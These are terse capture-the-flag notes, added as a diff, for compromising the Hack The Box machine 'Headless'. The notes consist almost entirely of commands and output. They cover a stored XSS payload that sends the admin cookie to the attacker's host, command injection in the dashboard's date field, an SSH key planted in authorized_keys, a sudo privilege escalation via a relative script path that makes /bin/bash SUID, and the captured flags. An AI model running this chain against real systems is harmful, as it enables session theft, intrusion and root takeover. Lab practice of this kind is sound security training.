@@ -1,0 +1,180 @@
+—-
+Headless
+——
+
+sudo nmap 10.129.100.45 -n -Pn -sCVS -p- --min-rate 1000 --disable-arp-ping -vv
+
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey:
+|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXBmWeZYo1LR50JTs8iKyICHT76i7+fBPoeiKDXRhzjsfMWruwHrosHoSwRxiqUdaJYLwJgWOv+jFAB45nRQHw=
+|   256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkBEMKoic0Bx5yLYG4DIT5G797lraNQsG5dtyZUl9nW
+5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 2.2.2 (Python 3.11.2)
+|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
+|_http-title: Under Construction
+| http-methods:
+|_  Supported Methods: HEAD GET OPTIONS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+echo 10.129.100.45 headless.htb | sudo tee -a /etc/hosts
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+http://headless.htb:5000/support
+---
+input to message form: <script>alert(1)</script>
+
+OUT
+
+Hacking Attempt Detected
+...
+Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
+...
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+gobuster dir -u http://headless.htb:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x py,html,js,zip,txt -t 100
+
+...
+/support              (Status: 200) [Size: 2363]
+/dashboard            (Status: 500) [Size: 265]
+...
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+User-Agent: <script>var i=new Image(); i.src="http://10.10.14.227:5000/?cookie="+btoa(document.cookie);</script>
+
+---
+
+POST /support HTTP/1.1
+Host: headless.htb:5000
+Content-Length: 221
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://headless.htb:5000
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: <script>var i=new Image(); i.src="http://10.10.14.227:5000/?cookie="+btoa(document.cookie);</script>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://headless.htb:5000/support
+Accept-Encoding: gzip, deflate, br
+Cookie: xss=1; is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
+Connection: keep-alive
+
+fname=test&lname=test&email=test%40headless.htb&phone=090909909000&message=%3Cscript%3Evar+i%3Dnew+Image%28%29%3B+i.src%3D%22http%3A%2F%2F10.10.14.227%3A5000%2F%3Fcookie%3D%22%2Bbtoa%28document.cookie%29%3B%3C%2Fscript%3E
+---
+
+python3 -m http.server 5000
+Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ...
+---
+
+10.129.100.45 - - [11/Nov/2026 03:56:11] "GET /?cookie=eHNzPTE7IGlzX2FkbWluPUltRmtiV2x1SWcuZG16RGtaTkVtNkNLMG95TDFmYk0tU25YcEgw HTTP/1.1" 200 ---
+
+echo eHNzPTE7IGlzX2FkbWluPUltRmtiV2x1SWcuZG16RGtaTkVtNkNLMG95TDFmYk0tU25YcEgw | base64 -d
+
+xss=1; is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+
+
+curl -X "POST" "http://10.129.100.45:5000/dashboard" -H "User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0" -H "Accept: " -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://10.129.100.45:5000" -H "Connection: close" -H "Referer: http://10.129.100.45:5000/dashboard" -H "Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0" -H "Upgrade-Insecure-Requests: 1" --data-raw "date=2023-09-15; id"
+
+...
+        Systems are up and running!
+uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
+
+...
+</html>
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+ssh-keygen
+
+---
+cat .ssh/id_ed25519.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBR0vbSI8ThippOdjnhduKWgW95yclJqSfWNFQwgxz09 scandice@htb-kszmllnf3t
+
+---
+curl -X "POST" "http://10.129.100.45:5000/dashboard" -H "User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0" -H "Accept: " -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://10.129.100.45:5000" -H "Connection: close" -H "Referer: http://10.129.100.45:5000/dashboard" -H "Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0" -H "Upgrade-Insecure-Requests: 1" --data-raw "date=2023-09-15; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBR0vbSI8ThippOdjnhduKWgW95yclJqSfWNFQwgxz09 scandice@htb-kszmllnf3t' > ../.ssh/authorized_keys"
+
+---
+ssh -i .ssh/id_ed25519 dvir@headless.htb
+
+The authenticity of host 'headless.htb (10.129.100.45)' can't be established.
+ED25519 key fingerprint is SHA256:JoPOIGP750NkjY3xUv/tl/yYanIZuu5BPSdYKu4Yn2I.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'headless.htb' (ED25519) to the list of known hosts.
+Linux headless 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+Last login: Wed Apr 10 17:10:31 2024 from 10.10.14.23
+dvir@headless:~$
+
+---
+dvir@headless:~$ cat user.txt
+d8bcb71aa115f2d51b4412bff1218a2d
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+sudo -l
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+
+---
+cat /usr/bin/syscheck
+
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+
+---
+dvir@headless:~$ echo "chmod u+s /bin/bash" > initdb.sh
+dvir@headless:~$ chmod +x initdb.sh
+dvir@headless:~$ sudo /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 1.9G
+System load average:  0.00, 0.03, 0.01
+Database service is not running. Starting it...
+
+---
+dvir@headless:~$ cd /root
+-bash: cd: /root: Permission denied
+
+---
+dvir@headless:~$ /bin/bash -p
+bash-5.2# cat /root/root.txt
+
+42ab675faaa74d888591bae47db21398
